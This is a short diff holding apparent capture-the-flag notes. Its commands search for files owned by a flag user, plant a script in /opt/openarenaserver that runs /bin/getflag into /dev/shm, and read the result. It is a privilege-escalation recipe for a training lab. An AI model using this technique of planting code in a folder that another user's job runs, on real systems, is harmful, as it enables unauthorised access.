@@ -1,0 +1,9 @@
+find / -user flag05 2>/dev/null
+
+vim /opt/openarenaserver/i
+
+/bin/getflag > /dev/shm/flag5
+
+chmod +x /opt/openarenaserver/i
+
+cat /dev/shm/flag5 
